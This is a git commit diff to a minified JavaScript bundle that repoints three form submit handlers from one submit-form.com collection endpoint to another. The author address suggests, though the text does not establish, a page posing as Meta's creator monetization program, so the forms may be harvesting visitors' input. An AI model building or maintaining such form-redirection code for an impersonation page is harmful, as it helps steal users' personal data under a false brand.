0a96ecfdec81cd84e330f9938dff97ec37e71777
metatre66 <meta.creator.monetization@gmail.com>
2025-07-22 16:35:05 -0700

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/KkNnafwVa", {
+                                    fetch("https://submit-form.com/HEDo3VpG6", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13355,7 +13355,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/KkNnafwVa", {
+                                    u && o ? (fetch("https://submit-form.com/HEDo3VpG6", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13465,7 +13465,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/KkNnafwVa", {
+                        fetch("https://submit-form.com/HEDo3VpG6", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
